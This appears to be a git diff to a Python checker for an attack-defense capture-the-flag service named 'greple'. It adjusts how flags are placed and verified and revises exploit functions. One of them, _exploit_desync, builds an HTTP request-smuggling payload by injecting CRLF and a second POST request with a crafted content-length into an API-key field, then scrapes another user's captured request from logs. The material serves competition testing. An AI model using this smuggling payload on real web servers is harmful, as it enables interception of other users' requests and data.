@@ -1,6 +1,7 @@
 """Checker for greple service."""
 
 import asyncio
+import hashlib
 import logging
 import random
 import re
@@ -29,6 +30,7 @@ from utils import (
     SHORT_URL_REGEX,
     assert_not_in,
     assert_status,
+    find_token,
     get_search_console,
     get_short_url,
     logger,
@@ -44,7 +46,6 @@ from utils import (
 )
 
 _CHECKER = Enochecker("greple", 7777)
-_FLAG_BASE_URL = httpx.URL("http://example.com")
 _REFRESH_HASH_RE = re.compile(r"refresh\('([0-9a-f]{56})'\)")
 
 
@@ -55,11 +56,11 @@ def _client(client: httpx.AsyncClient, logger: logging.LoggerAdapter) -> Client:
 
 @_CHECKER.putflag(0)
 async def _putflag_url(task: PutflagCheckerTaskMessage, client: Client, db: ChainDB) -> str:
-    username = username_noise(128)
-    await register_user(client, username)
-
     assert client.base_url.port is not None
     base_url = client.base_url.copy_with(port=client.base_url.port - random.randint(1, 7))
+
+    username = username_noise(128)
+    await register_user(client, username)
 
     await submit_page(client, False, str(base_url.join(f"/{quote(task.flag, safe='')}")))
 
@@ -83,10 +84,13 @@ async def _getflag_url(task: GetflagCheckerTaskMessage, client: Client, db: Chai
 
 @_CHECKER.putflag(1)
 async def _putflag_shor_url(task: PutflagCheckerTaskMessage, client: Client, db: ChainDB) -> str:
+    assert client.base_url.port is not None
+    base_url = client.base_url.copy_with(port=client.base_url.port - random.randint(1, 7))
+
     username = username_noise(128)
     await register_user(client, username)
 
-    short_url = await shorten_url(client, str(_FLAG_BASE_URL.join(f"/{quote(task.flag, safe='')}")))
+    short_url = await shorten_url(client, str(base_url.join(f"/{quote(task.flag, safe='')}")))
 
     paste_url = await paste(client, word_noise(16), short_url)
     await submit_page(client, False, str(paste_url))
@@ -222,31 +226,28 @@ async def _verify_netloc(client: Client) -> None:
 
     user_a = username_noise(128)
     await register_user(client, user_a)
-    url_a = str(base_url.join(f"/{letter_noise(16)}"))
-    await submit_page(client, False, url_a)
+    path_a = f"/{letter_noise(128)}"
+    await submit_page(client, False, str(base_url.join(path_a)))
 
     user_b = username_noise(128)
     await register_user(client, user_b)
 
     netloc = base_url.netloc.decode()
-    api_key = f"public{letter_noise(128)}"
+    api_key = letter_noise(128)
     netloc_hash = await verify_netloc(client, netloc, api_key)
 
-    while True:
-        logs = await logger(client)
-        t = re.search(f"user={re.escape(user_b)}&token=([0-9a-f]{{56}})", unquote(unescape(logs)))
-        if t:
-            break
-        await asyncio.sleep(0.1)
+    t = await find_token(client, user_b)
 
-    body = await token(client, netloc_hash, t[1])
-    assert_in(url_a, unescape(body), "Failed to find entries for verified netloc")
+    body = await token(client, netloc_hash, t)
+    assert_in(path_a, unescape(body), "Failed to find entries for verified netloc")
     assert_in(user_a, unescape(body), "Failed to find entries for verified netloc")
 
-    await submit_page(client, False, str(base_url.join(f"/{letter_noise(16)}")))
+    path_b = f"/{letter_noise(128)}"
+    await submit_page(client, False, str(base_url.join(path_b)))
 
-    logs = await logger(client)
-    assert_in(api_key, unescape(logs), "API-Key not found in logged request")
+    logs = await logger(client, path_b)
+    api_key_hash = hashlib.sha224(api_key.encode()).hexdigest()
+    assert_in(api_key_hash, unescape(logs), "API-Key not found in logged request")
 
 
 @_CHECKER.exploit(0)
@@ -282,7 +283,7 @@ async def _exploit_sca(
     )
 
     url = await get_short_url(client, SHORT_URL_PREFIX + short_url)
-    return unquote(url.removeprefix(str(_FLAG_BASE_URL)).lstrip("/"))
+    return unquote(url)
 
 
 @_CHECKER.exploit(2)
@@ -299,24 +300,21 @@ async def _exploit_desync(client: Client, task: ExploitCheckerTaskMessage) -> st
 
     netloc = url.netloc.decode()
     cl = (
-        103  # extra headers
-        + 197  # next request w/o flag
+        101  # extra headers
+        + 173  # next request w/o flag & path
+        + 24  # path
         + 51  # flag
     )
+    dump = f"/{letter_noise(128)}"
     netloc_hash = await verify_netloc(
         client,
         netloc,
-        f"\r\n\r\nPOST / HTTP/1.1\r\nhost:{netloc}\r\ncontent-length:{cl}\r\n\r\n",
+        f"\r\n\r\nPOST {dump} HTTP/1.1\r\nhost:{netloc}\r\ncontent-length:{cl}\r\n",
     )
 
-    while True:
-        logs = await logger(client)
-        t = re.search(f"user={re.escape(username)}&token=([0-9a-f]{{56}})", unquote(unescape(logs)))
-        if t:
-            break
-        await asyncio.sleep(0.1)
+    t = await find_token(client, username)
 
-    body = await token(client, netloc_hash, t[1])
+    body = await token(client, netloc_hash, t)
     refresh_hash = re.findall(
         f"{re.escape(task.attack_info)}</td><td>([^<]*)</td><td>No</td><td><a href=\"javascript:refresh\\('([^']*)",
         unescape(body),
@@ -329,10 +327,13 @@ async def _exploit_desync(client: Client, task: ExploitCheckerTaskMessage) -> st
         client.post("/refresh", data={"hash": next(h for u, h in refresh_hash if u != username)}),
     )
 
-    logs = await logger(client)
-    lines = "".join(re.findall("(?:[0-9a-f]{2} )+ ", unescape(logs)))
-    content = bytes.fromhex(lines.replace(" ", "")).decode()
-    return "\n".join(re.findall(task.flag_regex, content))
+    while True:
+        logs = await logger(client, dump)
+        lines = "".join(re.findall("(?:[0-9a-f]{2} )+ ", unescape(logs)))
+        if lines:
+            content = bytes.fromhex(lines.replace(" ", "")).decode()
+            return "\n".join(re.findall(task.flag_regex, content))
+        await asyncio.sleep(0.1)
 
 
 def app() -> fastapi.FastAPI:
